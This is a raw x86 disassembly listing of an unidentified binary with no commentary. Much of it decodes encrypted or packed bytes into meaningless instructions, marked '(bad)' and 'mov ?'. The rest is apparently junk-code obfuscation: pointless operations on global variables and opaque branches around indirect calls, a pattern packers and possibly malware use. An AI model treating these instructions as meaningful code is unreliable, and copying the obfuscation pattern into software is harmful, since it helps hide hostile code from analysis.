  4186b3:	cmp    DWORD PTR [edx-0x5d],esp
  4186b6:	lea    esp,[eax]
  4186b8:	xchg   edx,eax
  4186b9:	push   cs
  4186ba:	xchg   edx,eax
  4186bb:	jns    0x418643
  4186bd:	adc    ah,ah
  4186bf:	aad    0xd7
  4186c1:	int    0xdf
  4186c3:	and    ch,BYTE PTR ds:0x971a1ddb
  4186c9:	sub    BYTE PTR [edx+ebx*8-0x1b],cl
  4186cd:	pop    ebx
  4186ce:	jge    0x418697
  4186d0:	into   
  4186d1:	test   BYTE PTR [ebx+esi*1],0x7d
  4186d5:	mov    ebp,0xd1292786
  4186da:	inc    ebp
  4186db:	pop    esp
  4186dc:	and    dl,BYTE PTR [eax+0x758af2c2]
  4186e2:	pusha  
  4186e3:	into   
  4186e4:	xchg   ebx,eax
  4186e5:	mov    dh,0x9d
  4186e7:	push   ss
  4186e8:	xchg   ecx,eax
  4186e9:	mov    edx,esp
  4186eb:	in     al,dx
  4186ec:	test   eax,0x869adad4
  4186f1:	cs (bad) 
  4186f4:	jl     0x4186b7
  4186f6:	inc    eax
  4186f7:	mov    ebp,0x40a6888f
  4186fc:	pop    ss
  4186fd:	fldcw  WORD PTR [ebx+0x41f8d61c]
  418703:	loop   0x41877e
  418705:	jmp    0x418763
  418707:	jo     0x4186f3
  418709:	mov    edx,0xc0f889b6
  41870e:	popa   
  41870f:	pop    es
  418710:	xchg   esp,eax
  418711:	ins    BYTE PTR es:[edi],dx
  418712:	mov    WORD PTR [edi+0x7d],gs
  418715:	pop    edx
  418716:	rcl    DWORD PTR [eax+0x3e],0x5a
  41871a:	mov    edi,0x77ba8705
  41871f:	mov    edx,0x3d2ab9c
  418724:	pop    ss
  418725:	cmp    BYTE PTR [ebp-0x1f9e5108],bl
  41872b:	int    0xf4
  41872d:	inc    ebx
  41872e:	mov    ds:0x263a26f5,eax
  418733:	out    0x6f,al
  418735:	cmp    al,0xbf
  418737:	adc    ecx,DWORD PTR [ebx]
  418739:	sar    ecx,0x63
  41873c:	pop    eax
  41873d:	adc    ebx,DWORD PTR [eax+eiz*8+0x2d33b3b3]
  418744:	mov    edi,0xbb816f5a
  418749:	outs   dx,BYTE PTR ds:[esi]
  41874a:	mov    WORD PTR [eax+0x58],ds
  41874d:	aad    0x81
  41874f:	sub    eax,0xac2d358d
  418754:	aad    0x1c
  418756:	fcmove st,st(7)
  418758:	dec    ecx
  418759:	cs inc ebx
  41875b:	daa    
  41875c:	mov    BYTE PTR [ebx+0x76515bbd],al
  418762:	mov    esi,0x51318427
  418767:	out    dx,al
  418768:	mov    edx,0x1d477635
  41876d:	adc    BYTE PTR [edx-0x60],dl
  418770:	xchg   esi,eax
  418771:	mov    ah,0x68
  418773:	sub    BYTE PTR [ecx+0x5d],dl
  418776:	out    0x5,eax
  418778:	cmp    ebp,ebx
  41877a:	das    
  41877b:	scas   al,BYTE PTR es:[edi]
  41877c:	jnp    0x41870b
  41877e:	cmp    BYTE PTR [ebp+0x2b],ah
  418781:	pop    ecx
  418782:	in     eax,0xdc
  418784:	pop    eax
  418785:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418786:	jmp    0xdd10c7df
  41878b:	inc    esi
  41878c:	sbb    eax,0x646b49b6
  418791:	repnz call 0xc11c:0xf027b03
  418799:	mov    ds:0x9bc23ebb,eax
  41879e:	fsub   st,st(1)
  4187a0:	jne    0x418757
  4187a2:	cmc    
  4187a3:	inc    edx
  4187a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187a5:	and    al,0xf0
  4187a7:	repnz sti 
  4187a9:	lods   eax,DWORD PTR ds:[esi]
  4187aa:	mov    ebp,0xc3bff6c7
  4187af:	inc    ebp
  4187b0:	cdq    
  4187b1:	(bad)  
  4187b2:	jno    0x41880c
  4187b4:	mov    bl,ch
  4187b6:	pop    edi
  4187b7:	sbb    al,0x1e
  4187b9:	jg     0x418778
  4187bb:	mov    cl,0xb2
  4187bd:	mov    ds:0x821c215a,eax
  4187c2:	sahf   
  4187c3:	mov    esp,0x7622ff27
  4187c8:	pop    edx
  4187c9:	inc    esp
  4187ca:	mov    bh,0x63
  4187cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187cd:	cmp    eax,0x11bb5d22
  4187d2:	cmp    DWORD PTR [eax-0x630e0bfd],edx
  4187d8:	xchg   ebx,eax
  4187d9:	daa    
  4187da:	int    0xe5
  4187dc:	jne    0x41883b
  4187de:	mov    ds:0x3deed6d2,al
  4187e3:	adc    bh,BYTE PTR ss:[ebx+eax*8]
  4187e7:	push   esi
  4187e8:	pop    esp
  4187e9:	fs jge 0x41877b
  4187ec:	adc    eax,0xd0ea46ca
  4187f1:	in     al,0x7e
  4187f3:	dec    ebx
  4187f4:	icebp  
  4187f5:	mov    eax,0xd622dbc5
  4187fa:	pop    ecx
  4187fb:	ja     0x41884a
  4187fd:	cwde   
  4187fe:	stos   BYTE PTR es:[edi],al
  4187ff:	fdiv   DWORD PTR [ecx-0x7e]
  418802:	outs   dx,BYTE PTR ds:[esi]
  418803:	jb     0x41887f
  418805:	test   DWORD PTR [edx-0xd],edx
  418808:	jp     0x41880a
  41880a:	xor    al,0x50
  41880c:	mov    db2,ebp
  41880f:	or     eax,0x94b74708
  418814:	mov    edi,0x665f7038
  418819:	jmp    0x4187bb
  41881b:	inc    edx
  41881c:	dec    esi
  41881d:	inc    edx
  41881e:	push   es
  41881f:	std    
  418820:	add    al,al
  418822:	mov    cl,dh
  418824:	test   BYTE PTR [edi-0x5],cl
  418827:	xor    ebx,edx
  418829:	push   esi
  41882a:	adc    esp,DWORD PTR [ebp-0x75]
  41882d:	adc    al,0xf1
  41882f:	(bad)  
  418830:	repnz and al,BYTE PTR [ebp+0x1b6b171d]
  418837:	out    0xcf,eax
  418839:	mov    cs,WORD PTR [edx]
  41883b:	clc    
  41883c:	add    DWORD PTR [edi+eiz*2+0x34],esp
  418840:	mov    ecx,0x1e5f8637
  418845:	cmp    al,0x16
  418847:	nop
  418848:	or     DWORD PTR [edx-0x57950280],ecx
  41884e:	mov    edx,0xe713a248
  418853:	daa    
  418854:	sbb    al,0x4e
  418856:	fdivr  st(3),st
  418858:	xor    eax,DWORD PTR [eax+0x3b]
  41885b:	pop    ebp
  41885c:	sahf   
  41885d:	dec    edx
  41885e:	test   edi,eax
  418860:	les    ebp,FWORD PTR [esi+edi*4-0x637a5b07]
  418867:	jae    0x418822
  418869:	pusha  
  41886a:	inc    ebx
  41886b:	enter  0x7d9d,0xdf
  41886f:	adc    BYTE PTR [esi+0x54dd4b37],0x35
  418876:	enter  0xfa2a,0x70
  41887a:	xor    ebx,ebx
  41887c:	mov    cl,0xe0
  41887e:	xchg   ecx,eax
  41887f:	or     DWORD PTR [ebx+0x126fc575],0xffffffd9
  418886:	inc    ebx
  418887:	xchg   ecx,eax
  418888:	rol    dh,cl
  41888a:	lods   eax,DWORD PTR ds:[esi]
  41888b:	mov    dl,0x4c
  41888d:	shl    ebp,cl
  41888f:	dec    esp
  418890:	xchg   bl,dl
  418892:	adc    eax,0xaee67daf
  418897:	shl    BYTE PTR [eax-0x300d382c],1
  41889d:	adc    BYTE PTR [eax+0x27bfec9c],0x68
  4188a4:	or     eax,0x4f144f16
  4188a9:	mov    al,ds:0xc38bac5
  4188ae:	dec    ecx
  4188af:	rol    BYTE PTR [ecx+eax*2+0xe],cl
  4188b3:	push   cs
  4188b4:	jmp    0x4865d544
  4188b9:	or     DWORD PTR ds:0x42829b,0x42828b
  4188c3:	xor    eax,ecx
  4188c5:	adc    ecx,DWORD PTR ds:0x4281b3
  4188cb:	mov    ecx,DWORD PTR [esp+0x28]
  4188cf:	div    ecx
  4188d1:	adc    DWORD PTR ds:0x4282a3,0x4282fb
  4188db:	and    eax,0x100
  4188e0:	xor    DWORD PTR ds:0x4281ef,0x4282f3
  4188ea:	or     eax,0x290
  4188ef:	xor    DWORD PTR ds:0x42829f,0x4283df
  4188f9:	push   DWORD PTR [eax-0x494a7887]
  4188ff:	xor    DWORD PTR ds:0x4282db,0x7154
  418909:	call   DWORD PTR ds:0x428e08
  41890f:	or     DWORD PTR ds:0x4282f3,0x6165
  418919:	dec    esi
  41891a:	jne    0x417913
  418920:	add    DWORD PTR ds:0x4283f7,edi
  418926:	mov    DWORD PTR [esp+0x18],0xca79a575
  41892e:	cmp    DWORD PTR ds:0x42837f,0x0
  418935:	mov    DWORD PTR ds:0x42835f,ebx
  41893b:	mov    DWORD PTR ds:0x4282e3,ebx
  418941:	mov    esi,DWORD PTR ds:0x4282b3
  418947:	mov    esi,0x63e7
  41894c:	jmp    0x4189b1
  418951:	mov    esi,0x7fb2
  418956:	cmp    DWORD PTR ds:0x42837f,0x0
  41895d:	jb     0x41898b
  418963:	push   0x4fb4
  418968:	call   DWORD PTR ds:0x428e4c
  41896e:	movzx  esi,WORD PTR ds:0x428383
  418975:	sbb    DWORD PTR ds:0x4281c3,esi
  41897b:	adc    DWORD PTR ds:0x4283cf,0x5f0e
  418985:	xor    DWORD PTR ds:0x428407,ebx
  41898b:	mov    esi,DWORD PTR ds:0x428297
  418991:	xor    esi,DWORD PTR ds:0x4281d3
  418997:	mov    DWORD PTR ds:0x428297,esi
  41899d:	add    DWORD PTR ds:0x4282a7,0x2d72
  4189a7:	sbb    DWORD PTR ds:0x428403,0x7522
  4189b1:	mov    esi,0x9c1b89e8
  4189b6:	mov    DWORD PTR [esp+0x1c],esi
  4189ba:	and    DWORD PTR ds:0x4283db,0x42829b
  4189c4:	mov    DWORD PTR [esp+0x70],0xca79a571
  4189cc:	mov    DWORD PTR [esp+0x74],esi
  4189d0:	xor    DWORD PTR ds:0x4281c3,0xa7a
  4189da:	call   0x40aa10
  4189df:	cmp    DWORD PTR ds:0x42837b,0x0
  4189e6:	mov    edi,DWORD PTR ds:0x428303
  4189ec:	mov    edx,DWORD PTR ds:0x42828b
  4189f2:	not    edx
  4189f4:	jmp    0x418a47
  4189f9:	mov    DWORD PTR ds:0x428403,0x606f
  418a03:	mov    DWORD PTR ds:0x4281df,ebx
  418a09:	cmp    DWORD PTR ds:0x42837b,0x0
  418a10:	jle    0x418a3f
  418a16:	call   DWORD PTR ds:0x428e50
  418a1c:	adc    DWORD PTR ds:0x4281bb,ebx
  418a22:	or     DWORD PTR ds:0x4282bf,0x5c58
  418a2c:	xor    ecx,ecx
  418a2e:	add    ecx,DWORD PTR ds:0x42826f
  418a34:	mov    edx,DWORD PTR ds:0x428393
  418a3a:	sub    ecx,edx
  418a3c:	and    ecx,DWORD PTR [ecx+edx*1]
  418a3f:	sub    edi,edx
  418a41:	sbb    ecx,DWORD PTR ds:0x428383
  418a47:	lea    eax,[esp+0x44]
  418a4b:	mov    DWORD PTR [esp+0xc],eax
  418a4f:	lea    eax,[esp+0x60]
  418a53:	add    DWORD PTR ds:0x428307,edi
  418a59:	mov    DWORD PTR [esp+0x10],eax
  418a5d:	cmp    DWORD PTR ds:0x428403,0x0
  418a64:	mov    edx,0x1d6
  418a69:	mov    DWORD PTR ds:0x4282db,0x11c5
  418a73:	mov    DWORD PTR ds:0x4283f7,ecx
  418a79:	jmp    0x418ad0
  418a7e:	movzx  eax,WORD PTR ds:0x4281bb
  418a85:	mov    eax,ds:0x4282fb
  418a8a:	cmp    DWORD PTR ds:0x428403,0x0
  418a91:	je     0x418ab0
  418a97:	push   0x2fa1
  418a9c:	call   DWORD PTR ds:0x428ef0
  418aa2:	or     edi,ecx
  418aa4:	sbb    edi,0x59b9
  418aaa:	sbb    edx,0x32c6
  418ab0:	xor    DWORD PTR ds:0x4283d3,0x4bc8
  418aba:	sub    DWORD PTR ds:0x4282e3,edi
  418ac0:	or     DWORD PTR ds:0x4282db,0x2abb
  418aca:	sbb    DWORD PTR ds:0x4283cf,ebx
  418ad0:	mov    eax,ds:0x4225b8
  418ad5:	mov    eax,DWORD PTR [eax+0x1d8]
  418adb:	sbb    DWORD PTR ds:0x4281db,ebx
  418ae1:	jmp    0x418eb0
  418ae6:	js     0x418b42
  418ae8:	push   ebp
  418ae9:	xor    eax,0x1a781a3b
  418aee:	or     eax,0x5eb0b184
  418af3:	push   esp
  418af4:	sbb    BYTE PTR [edx+0x1816cb9a],ch
  418afa:	mov    esp,0x68181812
  418aff:	out    dx,al
  418b00:	push   cs
  418b01:	sub    edx,edx
  418b03:	retf   
  418b04:	pop    edx
  418b05:	ds dec ecx
  418b07:	(bad)  
  418b09:	push   esp
  418b0a:	mov    eax,0xb8ffdbad
  418b0f:	sbb    al,0xae
  418b11:	push   ecx
  418b12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b13:	push   0x98a6385b
  418b18:	inc    eax
  418b19:	icebp  
  418b1a:	sbb    eax,DWORD PTR [edx+0x701aeb82]
  418b20:	cmp    BYTE PTR [eax],ah
  418b22:	jp     0x418abb
  418b24:	cmp    DWORD PTR [esi+edi*2-0x3123904c],0xe4f162e5
  418b2f:	icebp  
  418b30:	add    BYTE PTR [ebp-0x6e266ced],al
  418b36:	fldcw  WORD PTR [ecx-0x2]
  418b39:	or     eax,0xeca63265
  418b3e:	mov    edi,DWORD PTR [esi+0x44]
  418b41:	ins    DWORD PTR es:[edi],dx
  418b42:	and    eax,0x3d2645a3
  418b47:	xor    bx,bx
  418b4a:	fcom   DWORD PTR [ecx]
  418b4c:	out    0xc2,al
  418b4e:	pop    es
  418b4f:	add    eax,0xad191e36
  418b54:	call   0x2e57fa2f
  418b59:	jp     0x418b6f
  418b5b:	add    DWORD PTR [edx],esi
  418b5d:	cmp    BYTE PTR [edx+edx*4-0x7c],al
  418b61:	and    al,0xc
  418b64:	pop    ebp
  418b65:	in     eax,0xf9
  418b67:	aas    
  418b68:	jo     0x418b39
  418b6a:	push   eax
  418b6b:	cmp    al,0x40
  418b6d:	call   0x783c:0x89c59d6
  418b74:	lods   al,BYTE PTR ds:[esi]
  418b75:	dec    edx
  418b76:	imul   ebx,DWORD PTR [ecx-0x64],0xffffffb7
  418b7a:	mov    esp,0x21e59097
  418b7f:	sbb    cl,BYTE PTR [ebx+0x4d]
  418b82:	xor    DWORD PTR [ecx],0x8fe32c99
  418b88:	imul   ebx,DWORD PTR [ecx],0x5797e844
  418b8e:	in     eax,0xed
  418b90:	pop    esi
  418b91:	sub    esp,DWORD PTR [eax-0x1b]
  418b94:	das    
  418b95:	push   esi
  418b96:	in     eax,0x8
  418b98:	sub    edi,DWORD PTR [esi-0x17]
  418b9b:	outs   dx,DWORD PTR ds:[esi]
  418b9c:	retf   0x44ad
  418b9f:	inc    eax
  418ba0:	mov    bl,0x3a
  418ba2:	idiv   BYTE PTR [eax+ecx*4-0x7a]
  418ba6:	(bad)  
  418ba7:	popf   
  418ba8:	xchg   eax,ebx
  418baa:	stos   DWORD PTR es:[edi],eax
  418bab:	add    eax,DWORD PTR [eax-0x5fe40f01]
  418bb1:	xor    al,0x7d
  418bb3:	push   esp
  418bb4:	pop    es
  418bb5:	fst    st(6)
  418bb7:	fs mov al,0xb
  418bba:	cmp    eax,0xca48c789
  418bbf:	outs   dx,BYTE PTR ds:[esi]
  418bc0:	sti    
  418bc1:	xor    esi,DWORD PTR [ecx+0x0]
  418bc4:	sub    edi,DWORD PTR [ecx+0x79]
  418bc7:	dec    ebp
  418bc8:	pushf  
  418bc9:	xor    BYTE PTR [ebx-0x5e],cl
  418bcc:	stos   BYTE PTR es:[edi],al
  418bcd:	xchg   ebp,eax
  418bce:	mov    dl,0x18
  418bd0:	(bad)  
  418bd2:	push   esi
  418bd3:	push   edi
  418bd4:	mov    esi,DWORD PTR [eax+edx*1+0x5c]
  418bd8:	lahf   
  418bd9:	or     dl,BYTE PTR [edx]
  418bdb:	out    0x6e,eax
  418bdd:	push   edx
  418bde:	push   0x815fe4df
  418be3:	jmp    0xc986:0x9cf6d23b
  418bea:	mov    DWORD PTR [ebx-0xcff9428],eax
  418bf0:	nop
  418bf1:	mov    bl,0x88
  418bf3:	ffree  st(4)
  418bf5:	pusha  
  418bf6:	pop    es
  418bf7:	xlat   BYTE PTR ds:[ebx]
  418bf8:	outs   dx,DWORD PTR ds:[esi]
  418bf9:	jnp    0x418c42
  418bfb:	and    BYTE PTR [edx-0x68322cb6],ah
  418c01:	pop    eax
  418c02:	inc    edx
  418c03:	into   
  418c04:	jmp    0x111e:0x7ba1fd82
  418c0b:	and    al,0x86
  418c0d:	aam    0xd3
  418c0f:	xor    esi,DWORD PTR [edi-0x66d382b9]
  418c15:	sub    DWORD PTR [esi],ebx
  418c17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c18:	jecxz  0x418c3a
  418c1a:	sub    al,0x4b
  418c1c:	cli    
  418c1d:	icebp  
  418c1e:	xor    al,0x1
  418c20:	push   ss
  418c21:	(bad)  
  418c22:	pop    ebp
  418c23:	stos   BYTE PTR es:[edi],al
  418c24:	iret   
  418c25:	mov    eax,ds:0xc109cd0b
  418c2a:	cdq    
  418c2b:	es mov dl,0x9f
  418c2e:	pop    ss
  418c2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c30:	or     BYTE PTR [esi-0x43],ah
  418c33:	push   cs
  418c34:	mov    bh,0xed
  418c36:	lock sub edi,DWORD PTR [esi+0x43656747]
  418c3d:	call   DWORD PTR [edx-0x130c1b31]
  418c43:	mov    al,0x94
  418c45:	mov    ecx,ebp
  418c47:	adc    edx,DWORD PTR [ebx]
  418c49:	imul   edi,DWORD PTR [esi+0x56],0xffffffc2
  418c4d:	repz push 0x7cdb3c1e
  418c53:	add    ch,BYTE PTR [eax+0x1e]
  418c56:	push   ecx
  418c57:	or     ah,BYTE PTR [edi+0x4f]
  418c5a:	fadd   DWORD PTR [esp+ebp*1-0x7ecf7d2d]
  418c61:	adc    ebx,edx
  418c63:	jecxz  0x418c39
  418c65:	leave  
  418c66:	inc    edx
  418c67:	xor    DWORD PTR [ebp-0x2d8794e6],ecx
  418c6d:	xor    DWORD PTR [edx+ecx*2+0x7517a3c0],ebp
  418c74:	jae    0x418c30
  418c76:	or     al,0xd9
  418c78:	scas   al,BYTE PTR es:[edi]
  418c79:	cs cmp eax,0x66434e84
  418c7f:	jl     0x418c11
  418c81:	lock in eax,0xab
  418c84:	imul   eax,edi,0x39185785
  418c8a:	mov    ebp,DWORD PTR ds:0x7d00ef32
  418c90:	call   0xebbf8456
  418c95:	jb     0x418ccf
  418c97:	inc    ecx
  418c98:	mov    edx,0x8f5e52e4
  418c9d:	lods   al,BYTE PTR ds:[esi]
  418c9e:	jo     0x418c61
  418ca0:	fadd   QWORD PTR [edi+ebp*2]
  418ca3:	leave  
  418ca4:	pushf  
  418ca5:	in     al,0x21
  418ca7:	lds    ebx,FWORD PTR [eax+0x62]
  418caa:	lds    esi,FWORD PTR [edx+0x58019267]
  418cb0:	js     0x418cbb
  418cb2:	mov    ebp,0x7034ba58
  418cb7:	sub    ecx,DWORD PTR [ecx+ecx*2]
  418cba:	call   0xf175:0x30c7a8e9
  418cc1:	rol    DWORD PTR [edx-0x5c80a5a2],0x83
  418cc8:	aaa    
  418cc9:	xchg   bh,ch
  418ccb:	sub    eax,0xe0f13034
  418cd0:	cli    
  418cd1:	loop   0x418cf8
  418cd3:	xchg   BYTE PTR [eax],cl
  418cd5:	push   es
  418cd6:	aas    
  418cd7:	retf   0x8d0b
  418cda:	rcr    DWORD PTR [eax],cl
  418cdc:	shl    BYTE PTR [ebx+0x7c5a742b],0x74
  418ce3:	stos   DWORD PTR es:[edi],eax
  418ce4:	cmp    BYTE PTR [ebp+0x2d6ab17a],cl
  418cea:	push   edx
  418ceb:	or     esp,edi
  418ced:	sar    ah,1
  418cef:	in     al,dx
  418cf0:	int    0x52
  418cf2:	adc    ebx,edi
  418cf4:	(bad)  
  418cf6:	bound  edx,QWORD PTR [eax-0x73b1e10]
  418cfc:	add    DWORD PTR [edx],0xffffffda
  418cff:	imul   esp,DWORD PTR [eax+ecx*2-0x712e5483],0x47
  418d07:	push   0x77840a08
  418d0c:	push   ss
  418d0d:	dec    eax
  418d0e:	and    ch,BYTE PTR [esi-0x4f]
  418d11:	adc    al,0x5d
  418d13:	cmp    DWORD PTR [esi-0x46],0x91e187a9
  418d1a:	icebp  
  418d1b:	ins    DWORD PTR es:[edi],dx
  418d1c:	test   DWORD PTR [ecx],edi
  418d1e:	dec    ebx
  418d1f:	inc    ebp
  418d20:	imul   esi,ebx,0xcc1ec115
  418d26:	jae    0x418ce2
  418d28:	cli    
  418d29:	adc    cl,BYTE PTR [edi]
  418d2b:	mov    DWORD PTR [eax+0x15],0x54a72c0a
  418d32:	lahf   
  418d33:	adc    eax,DWORD PTR [esp+ebp*1+0x6c]
  418d37:	js     0x418cd9
  418d39:	test   BYTE PTR es:[esi-0x1e9314c5],ah
  418d40:	cmc    
  418d41:	mov    ebp,0x2a9b815f
  418d46:	int3   
  418d47:	hlt    
  418d48:	ret    0x66e
  418d4b:	cmp    bh,BYTE PTR [edi+eax*4]
  418d4e:	aam    0x39
  418d50:	inc    esp
  418d51:	pop    ss
  418d52:	ficomp DWORD PTR gs:[ebp+0x766fd880]
  418d59:	or     al,0x7f
  418d5b:	adc    al,0x52
  418d5d:	sub    DWORD PTR [edi],ebx
  418d5f:	and    esp,DWORD PTR [ebp+0x2b26b06c]
  418d65:	and    cl,bh
  418d67:	add    al,0xdb
  418d69:	push   ax
  418d6b:	call   0x3683:0x2b4b7195
  418d72:	(bad)  
  418d73:	(bad)  
  418d74:	je     0x418d0d
  418d76:	sub    ecx,DWORD PTR [ebp-0x49]
  418d79:	cmp    bh,BYTE PTR [bx+di-0x7a]
  418d7d:	cmp    BYTE PTR [edx+0x6],0xbd
  418d81:	pushf  
  418d82:	lods   al,BYTE PTR ds:[esi]
  418d83:	and    ecx,DWORD PTR [ebp+0x21]
  418d86:	test   al,0x4c
  418d88:	add    eax,0x1d0c884e
  418d8d:	jns    0x418d3c
  418d8f:	mov    WORD PTR [ebp+0x63],fs
  418d92:	inc    ebx
  418d93:	xchg   esi,eax
  418d94:	jle    0x418d99
  418d96:	aam    0x38
  418d98:	jle    0x418d1d
  418d9a:	call   0x235f:0x929fed15
  418da1:	xchg   ebx,eax
  418da2:	out    dx,al
  418da3:	fs out dx,eax
  418da5:	in     eax,0x26
  418da7:	js     0x418d85
  418da9:	lock jmp 0xe48:0x4b9ffb9
  418db1:	aaa    
  418db2:	cwde   
  418db3:	fucom  st(5)
  418db5:	pusha  
  418db6:	adc    dh,bh
  418db8:	ret    0x3d70
  418dbb:	lahf   
  418dbc:	sub    bl,dl
  418dbe:	sub    eax,0xffffff83
  418dc1:	jge    0x418d46
  418dc3:	and    ebx,DWORD PTR [esi]
  418dc5:	cdq    
  418dc6:	fild   DWORD PTR [ebp-0x6c]
  418dc9:	push   eax
  418dca:	cwde   
  418dcb:	jp     0x418da2
  418dcd:	fcom   DWORD PTR [edi+0x66602619]
  418dd3:	pop    ss
  418dd4:	arpl   si,bx
  418dd6:	aaa    
  418dd7:	mov    esi,0xb66c93dd
  418ddc:	sbb    ch,dl
  418dde:	daa    
  418ddf:	push   ss
  418de0:	pop    esp
  418de1:	out    dx,al
  418de2:	in     eax,0x84
  418de4:	jg     0x418e26
  418de6:	adc    eax,0xfffffff1
  418de9:	add    ecx,esp
  418deb:	and    DWORD PTR [eax-0x39],edx
  418dee:	push   cs
  418def:	push   esp
  418df0:	add    cl,BYTE PTR [ecx-0x6d]
  418df3:	adc    edx,DWORD PTR [ebx]
  418df5:	pusha  
  418df6:	rcl    dh,0xbf
  418df9:	or     DWORD PTR [ebx+0x60],edx
  418dfc:	jo     0x418e0c
  418dfe:	jg     0x418d89
  418e00:	imul   ebp,eax,0x44
  418e03:	fdivr  DWORD PTR [ebx+ebp*2+0xd]
  418e07:	xlat   BYTE PTR ds:[ebx]
  418e08:	stc    
  418e09:	jge    0x418de5
  418e0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e0d:	jne    0x418dac
  418e0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e10:	rol    DWORD PTR [ecx],cl
  418e12:	idiv   DWORD PTR [esi]
  418e14:	inc    ebp
  418e15:	mov    ebp,0xc61db889
  418e1a:	mov    ecx,0xb0899a3c
  418e1f:	jle    0x418ddb
  418e21:	in     al,dx
  418e22:	retf   0x4f25
  418e25:	dec    esp
  418e26:	fcom   QWORD PTR [ecx+0x55]
  418e29:	ins    DWORD PTR es:[edi],dx
  418e2a:	xchg   ebp,eax
  418e2b:	pop    ecx
  418e2c:	push   edi
  418e2d:	adc    al,0x48
  418e2f:	int3   
  418e30:	loop   0x418e62
  418e32:	sub    al,0xd9
  418e34:	add    BYTE PTR [edx+0x24548dd9],bh
  418e3a:	push   0x24
  418e3c:	push   eax
  418e3d:	push   ecx
  418e3e:	dec    esi
  418e3f:	out    dx,al
  418e40:	xor    esp,DWORD PTR [esi+0x68]
  418e43:	inc    esi
  418e44:	push   0xecae080c
  418e49:	add    DWORD PTR [eax+0x28],0x30d51bd3
  418e50:	push   esp
  418e51:	sub    DWORD PTR [edi],esi
  418e53:	pop    ss
  418e54:	pusha  
  418e55:	and    BYTE PTR [edi-0x3323f8f2],ah
  418e5b:	enter  0xf877,0x8f
  418e5f:	jne    0x418e0d
  418e61:	test   eax,0x6a0904fe
  418e66:	push   ecx
  418e67:	sbb    bh,dh
  418e69:	jg     0x418df9
  418e6b:	push   ss
  418e6c:	push   ebx
  418e6d:	pop    ecx
  418e6e:	je     0x418e63
  418e70:	mov    ecx,0x9b950e6
  418e75:	popf   
  418e76:	mov    esi,0xb16b04cf
  418e7b:	jno    0x418ead
  418e7d:	cmp    esi,DWORD PTR [esi+0xb9a8676]
  418e83:	aam    0xff
  418e85:	inc    eax
  418e86:	mov    ?,WORD PTR [edi+0x287100f9]
  418e8c:	clc    
  418e8d:	out    dx,eax
  418e8e:	add    al,0xa7
  418e90:	or     ecx,DWORD PTR [ebp-0x7fe2bd4d]
  418e96:	pop    esp
  418e97:	test   BYTE PTR [ebx],bl
  418e99:	gs jmp 0x7652:0x5533beba
  418ea1:	push   ecx
  418ea2:	mul    al
  418ea4:	add    eax,0xc3dd3289
  418ea9:	add    eax,0x9386d507
  418eae:	mov    ?,WORD PTR [eax-0x36dcff75]
  418eb4:	mov    ecx,eax
  418eb6:	xor    ecx,0xa4069aaf
  418ebc:	cmp    DWORD PTR ds:0x4283ff,0x0
  418ec3:	mov    DWORD PTR ds:0x4281c7,0x216c
  418ecd:	mov    DWORD PTR ds:0x4282cb,0x28e7
  418ed7:	mov    DWORD PTR ds:0x4282c3,0x19fa
  418ee1:	jmp    0x418f4e
  418ee6:	mov    DWORD PTR ds:0x4282d3,0x562c
  418ef0:	mov    DWORD PTR ds:0x4282fb,0x3af5
  418efa:	cmp    DWORD PTR ds:0x4283ff,0x0
  418f01:	jae    0x418f2c
  418f07:	push   0x615d
  418f0c:	push   0x428387
  418f11:	push   DWORD PTR [ebp-0x28]
  418f14:	call   DWORD PTR ds:0x428e54
  418f1a:	not    DWORD PTR ds:0x4281fb
  418f20:	sub    DWORD PTR ds:0x4283ef,0x3f9
  418f2a:	adc    edx,edx
  418f2c:	sub    edi,DWORD PTR ds:0x4281b3
  418f32:	mov    edx,DWORD PTR ds:0x4282f7
  418f38:	sbb    DWORD PTR ds:0x4283db,edx
  418f3e:	xor    edi,edi
  418f40:	or     edi,DWORD PTR ds:0x428333
  418f46:	mov    edi,DWORD PTR [edi]
  418f48:	and    DWORD PTR ds:0x42836b,edi
  418f4e:	xor    eax,0xfffffffe
  418f51:	and    DWORD PTR ds:0x4283ef,edi
  418f57:	shl    eax,0x1e
  418f5a:	shr    ecx,0x2
  418f5d:	sbb    DWORD PTR ds:0x428403,edi
  418f63:	or     ecx,eax
  418f65:	cmp    DWORD PTR ds:0x42835b,0x0
  418f6c:	not    DWORD PTR ds:0x4282c7
  418f72:	not    DWORD PTR ds:0x4281f7
  418f78:	mov    DWORD PTR ds:0x42834f,0x4dce
  418f82:	mov    edx,0xaa6
  418f87:	jmp    0x418fde
  418f8c:	mov    eax,ds:0x42837f
  418f91:	mov    eax,0x4392
  418f96:	cmp    DWORD PTR ds:0x42835b,0x0
  418f9d:	jae    0x418fc8
  418fa3:	push   0x4547
  418fa8:	push   0x4fda
  418fad:	push   DWORD PTR [ebp-0x1c]
  418fb0:	push   0x4283db
  418fb5:	call   DWORD PTR ds:0x428e58
  418fbb:	inc    edx
  418fbc:	or     DWORD PTR ds:0x42828f,ebx
  418fc2:	xor    edi,DWORD PTR ds:0x4281ef
  418fc8:	sbb    edx,0x3d5c
  418fce:	xor    DWORD PTR ds:0x4283df,0x3cf0
  418fd8:	sub    edx,0x3f96
  418fde:	mov    eax,DWORD PTR [esp+0x10]
  418fe2:	mov    DWORD PTR [eax],ecx
  418fe4:	mov    edi,0xca79a565
  418fe9:	add    DWORD PTR ds:0x4281eb,0x586a
  418ff3:	mov    DWORD PTR [esp+0x80],edi
  418ffa:	and    DWORD PTR ds:0x4281cf,ecx
  419000:	mov    DWORD PTR [esp+0x84],esi
  419007:	cmp    DWORD PTR ds:0x4281bf,0x0
  41900e:	mov    DWORD PTR ds:0x4281d3,0x4347
  419018:	mov    DWORD PTR ds:0x4281f7,0x6064
  419022:	mov    DWORD PTR ds:0x4282df,edi
  419028:	jmp    0x419076
  41902d:	mov    DWORD PTR ds:0x4282b3,edi
  419033:	mov    eax,0x1d71
  419038:	cmp    DWORD PTR ds:0x4281bf,0x0
  41903f:	jl     0x419063
  419045:	push   DWORD PTR [ebp-0x18]
  419048:	push   DWORD PTR [ebp-0x28]
  41904b:	push   0x1442
